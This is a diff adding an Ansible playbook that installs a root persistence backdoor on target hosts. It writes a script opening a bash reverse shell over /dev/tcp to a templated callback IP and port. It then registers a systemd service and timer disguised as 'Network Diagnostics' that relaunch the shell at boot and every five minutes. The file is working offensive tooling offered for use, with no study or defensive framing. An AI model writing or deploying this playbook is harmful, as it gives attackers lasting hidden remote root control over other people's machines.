@@ -1,0 +1,70 @@
+# playbooks/systemd_timer_persistence.yml
+---
+- name: Systemd Timer Persistence
+  hosts: targets
+  become: yes
+  gather_facts: no
+
+  tasks:
+
+    - name: Deploy payload script
+      copy:
+        dest: /usr/local/lib/sys-network-check.sh
+        mode: '0755'
+        owner: root
+        group: root
+        content: |
+          #!/bin/bash
+          if ! pgrep -f "{{ callback_ip }}:{{ callback_port }}" > /dev/null 2>&1; then
+            bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1
+          fi
+
+    - name: Create systemd service unit
+      copy:
+        dest: /etc/systemd/system/sys-network-check.service
+        mode: '0644'
+        owner: root
+        group: root
+        content: |
+          [Unit]
+          Description=Network Diagnostics Check
+          After=network.target
+
+          [Service]
+          Type=oneshot
+          ExecStart=/usr/local/lib/sys-network-check.sh
+          StandardOutput=null
+          StandardError=null
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Create systemd timer unit
+      copy:
+        dest: /etc/systemd/system/sys-network-check.timer
+        mode: '0644'
+        owner: root
+        group: root
+        content: |
+          [Unit]
+          Description=Network Diagnostics Timer
+          Requires=sys-network-check.service
+
+          [Timer]
+          OnBootSec=30s
+          OnUnitActiveSec=5min
+          AccuracySec=1s
+          Persistent=true
+
+          [Install]
+          WantedBy=timers.target
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start the timer
+      systemd:
+        name: sys-network-check.timer
+        enabled: yes
+        state: started
